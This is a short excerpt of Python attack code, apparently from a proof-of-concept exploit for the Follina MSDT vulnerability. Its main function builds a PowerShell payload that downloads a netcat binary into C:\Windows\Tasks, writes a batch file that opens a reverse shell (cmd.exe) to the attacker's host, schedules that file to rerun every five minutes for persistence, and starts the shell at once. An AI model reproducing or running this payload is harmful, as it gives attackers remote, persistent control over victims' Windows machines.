...
def main(args):
    ...
    if args.reverse:
        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; echo '@echo off' > C:\\Windows\\Tasks\\scriptfollina.bat ; echo 'C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}' >> C:\\Windows\\Tasks\\scriptfollina.bat ; schtasks /create /tn 'tfollina' /tr 'C:\\Windows\\Tasks\\scriptfollina.bat' /sc minute /mo 5  ; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
